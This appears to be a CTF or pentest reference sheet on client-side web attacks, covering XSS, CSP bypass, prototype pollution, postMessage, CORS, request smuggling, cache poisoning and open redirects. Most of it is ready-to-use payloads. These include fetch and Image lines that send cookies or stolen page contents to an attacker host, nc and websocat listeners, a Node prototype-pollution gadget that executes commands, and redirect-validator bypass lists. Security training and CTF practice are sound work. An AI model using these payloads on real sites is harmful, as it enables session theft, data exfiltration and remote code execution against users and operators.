# Client-side — XSS, CSP, prototype pollution, CORS, smuggling, cache

When an "admin bot" exists, the intended path is client-side: the bot visits a URL
you report, with the bot's authenticated session. Your payload must survive CSP and
exfiltrate through whatever channel the bot allows.

## 1. XSS delivery and exfiltration

### Context → payload

| Injection context | Payload shape |
|---|---|
| HTML body | `<script>fetch('http://YOU/?c='+document.cookie)</script>` |
| Inside an attribute | `"><svg onload=fetch('http://YOU/'+document.cookie)>` |
| Inside JS string | `';fetch('http://YOU/'+document.cookie);//` (mind JSON escaping) |
| URL/redirect param | `javascript:fetch('http://YOU/'+document.cookie)` (needs anchor click) |
| Markdown/WYSIWYG | raw HTML pass-through, `[x](javascript:...)`, `<img src=x onerror=...>` |
| File name rendered | name contains `<img src=x onerror=...>` |

Bypass kit: case `OnErRoR`, no-tag sinks `<svg/onload=...>`, backtick/no-quote attrs,
`autofocus onfocus=alert(1)//`, `<details open ontoggle=...>` when script tags are
filtered but event attributes are not, unicode escapes `\u003c` inside JS strings
when the app writes your string into one.

### Exfil listeners (run locally; bot must be able to reach you)

```bash
# HTTP: query string lands in the log
python3 -m http.server 8080                # watch GET /?c=SESSION lines
nc -lvnp 8080                              # raw one-shot

# WebSocket (when outbound http is filtered but ws passes; sudo pacman -S websocat):
websocat -s 8080                           # prints every message received
```

```js
// HTTP channel
new Image().src='http://YOU:8080/?c='+document.cookie
// WebSocket channel
new WebSocket('ws://YOU:8080').onopen=e=>e.target.send(document.cookie)
```

HttpOnly cookies kill `document.cookie` — steal content instead of the cookie:

```js
// the bot's own session fetches the flag; exfil the response body
fetch('/api/flag').then(r=>r.text()).then(t=>new Image().src='http://YOU:8080/?f='+btoa(t))
// or perform the privileged action (CSRF+XSS combo)
fetch('/admin/flag',{method:'POST'}).then(r=>r.text()).then(t=>location='http://YOU:8080/?f='+encodeURIComponent(t))
```

Deploying a listener the bot can reach = touching remote infra: clear it with the
user first (router gate). Same-origin stashing (store payload on the challenge app
itself, e.g. your profile page) avoids outbound entirely when the bot's browser is
isolated.

## 2. CSP analysis and bypass

Read the policy from the response header (`curl -s -D - -o /dev/null "$URL" | grep -i content-security`) or `<meta http-equiv="Content-Security-Policy">`.
Evaluate at https://csp-evaluator.withgoogle.com (paste the policy only, not event data).

| Policy feature | Bypass |
|---|---|
| `script-src` includes `unsafe-inline` | plain `<script>` works — done |
| `script-src` allows a domain with a JSONP endpoint | `<script src="https://accounts.google.com/o/oauth2/revoke?callback=YOURFUNC"></script>`; define `YOURFUNC` inline if `unsafe-inline`, else chain another allowed source |
| `default-src` set but `object-src` missing | `<object data="data:text/html,<script>...</script>">` |
| no `base-uri` | `<base href="http://YOU/">` then relative script loads fetch yours |
| `script-src 'self'` + file upload | upload `.js`, include `<script src="/uploads/x.js">` |
| nonce reused across responses / static | lift the nonce from any response, reuse in injected tag |
| `img-src *` (or default) | exfil channel: `new Image().src='//YOU/?'+data` even when scripts constrained |

## 3. Prototype pollution

Sources (find where the app merges user input into objects):

```text
?__proto__[x]=1                  query/body parsed by qs-style libs (older express)
?constructor[prototype][x]=1     __proto__ key blocked
{"__proto__":{"x":1}}            JSON deep-merge (lodash <4.17.12 merge/defaultsDeep, custom recursions)
# detection (browser console):
console.log({}.x)                // 1 = polluted
```

Client-side: pollution is free XSS only with a gadget — find code doing
`obj[key] || default` or assigning polluted names into sinks: classic gadgets reach
`innerHTML`, script `src`, `href` (javascript:), webcomponent attributes. Hunt:
`grep -R "\.innerHTML\|location\s*=" dist/js/` after polluting candidate keys.

Server-side (Node): pollute `child_process`-adjacent options, then wait for any
spawn:

```json
{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "argv0": "console.log(require(\"child_process\").execSync(\"id\").toString())//"}}
```

This is the published env/argv0 gadget: Node places `argv0` into the environment,
and `NODE_OPTIONS=--require /proc/self/environ` makes node load its own environ as
code — the `argv0` value executes. Fires when the app spawns any child process
(git calls, thumbnails, job queues).

## 4. postMessage

Find on target:

```js
// console: catch everything the page receives
window.addEventListener('message', e => console.log(e.origin, e.data))
```

```html
<!-- attacker page: target iframe, fire commands with wildcard targetOrigin -->
<iframe src="https://target/profile" id="f"></iframe>
<script>
  f.contentWindow.postMessage({action:'getFlag'}, '*')
  fetch('/log').then(...)   // or relay results back via your own channel
</script>
```

Bugs: receiver never checks `event.origin`; sends replies with `postMessage(data,'*')`
(leak); accepts object types that reach dangerous sinks. Read the minified JS for
`addEventListener('message'` handlers and enumerate accepted `data` shapes.

## 5. CORS misconfiguration

```bash
curl -s -D - -o /dev/null -H "Origin: https://evil.com" "$base/api/secret" | grep -i access-control
# reflect + credentials = win:
#   Access-Control-Allow-Origin: https://evil.com
#   Access-Control-Allow-Credentials: true
```

Also test origin variations (subdomain `x.target.com`, `target.com.evil.com`,
null via sandboxed iframe `Origin: null`). Exploit (run from any page you control):

```html
<script>
fetch('https://target/api/secret', {credentials:'include'})
  .then(r=>r.text()).then(t=>document.location='http://YOU:8080/?d='+btoa(t))
</script>
```

## 6. Request smuggling (basics)

Front-end and back-end disagree about `Content-Length` vs `Transfer-Encoding`:

```text
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

X
```

CL.TE (front trusts CL, back trusts TE): the smuggled `X` prefixes the next
victim request → response desync, cache poison, or credential capture in error
responses. Detection first, harm never: send the above, then a normal GET — if it
hangs, errors, or the second response contains another user's data, the
desync exists. Tooling: Burp Suite's HTTP Request Smuggler extension (BApp Store);
manual raw sockets via `printf` piped to `nc target 80` when Burp is unavailable.
HTTP/2 front-ends: Burp handles H2.CL/H2.TE variants in Repeater.

## 7. Cache poisoning / web cache deception

Unkeyed inputs (headers not part of the cache key) that change the response:

```bash
for h in 'X-Forwarded-Host: you.example' 'X-Forwarded-Scheme: http' \
         'X-Original-URL: /admin' 'X-Rewrite-URL: /admin' 'X-Host: you.example'; do
  echo "== $h"
  curl -s -D - -o /dev/null -H "$h" "$base/" | grep -iE 'location|example|access-control|x-forwarded'
done
# then: does the cached response for a normal victim change after your request?
#   1) curl -H "X-Forwarded-Host: you" URL   2) curl URL  (fresh request, poisoned?)
```

Cache deception (different bug): check if `/api/secret/nonexistent.css` (path suffix
that caches miss-auth) returns the authenticated JSON with a cache-hit header — then
the admin bot's data is cached for you. Find cache keys/behavior via response headers
(`X-Cache`, `Age`, `Via`). Burp Param Miner's "Guess headers"/"Active cache detection"
automates discovery.

## 8. Open redirect as a gadget

```text
# bypass list for ?next= / ?redirect= validators:
https://you.example
//you.example          \/\/you.example       https://target.com@you.example
/\/you.example        %2f%2fyou.example     .you.example (subdomain allowlist)
target.com.you.example   //target@you.example   /%09/you.example
```

Gadget chains where "the redirect stays on our domain" checks are fooled:
OAuth `redirect_uri` validation (see `references/auth.md`), DOM XSS via
`location=param`, admin-bot allowlists that only check the first hop, and
SSRF allowlists that follow redirects. Test: `curl -s -D - -o /dev/null "$base/r?next=//you.example" | grep -i location`.
